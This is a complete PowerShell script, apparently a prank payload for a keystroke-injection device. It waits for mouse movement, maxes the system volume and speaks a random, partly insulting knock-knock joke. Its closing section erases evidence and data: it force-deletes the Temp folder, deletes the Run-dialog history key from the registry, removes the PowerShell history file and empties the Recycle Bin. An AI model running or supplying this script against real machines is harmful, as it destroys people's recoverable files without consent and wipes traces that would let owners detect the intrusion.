# Import the System.Windows.Forms assembly
Add-Type -AssemblyName System.Windows.Forms

# Store the original position of the cursor
$originalPOS = [System.Windows.Forms.Cursor]::Position

# Loop until the cursor position changes
while (1) {
    # Check if the cursor position has changed
    if ([Windows.Forms.Cursor]::Position -ne $originalPOS) {
        # If the cursor has moved, exit the loop
        break
    }
}

# At this point, the script will continue executing

$Speak = New-Object -ComObject SAPI.SpVoice

# This turns the volume up to max level
$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}

# Define a list of knock knock jokes
$jokes = @(
 "Knock knock. Who's there? Nobody... because you don't have any friends.",
 "Knock knock. Who's there? Me, your past mistakes.",
 "Knock knock. Who's there? No one. Just thought you should know how it feels to be ignored.",
 "Knock knock. Who's there? Lettuce. Lettuce who? Lettuce in, it's cold out here!",
 "Knock knock. Who's there? Tank. Tank who? You're welcome!",
 "Knock knock. Who's there? Boo. Boo who? Don't cry, it's just a joke!",
 "Knock knock. Who's there? Banana. Banana who? Knock knock. Who's there? Banana. Banana who? Knock knock. Who's there? Orange. Orange who? Orange you glad I didn't say banana again?"
)

# Choose a random joke from the list
$joke = Get-Random -InputObject $jokes

# Speak the joke
$Speak.Speak($joke)

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue
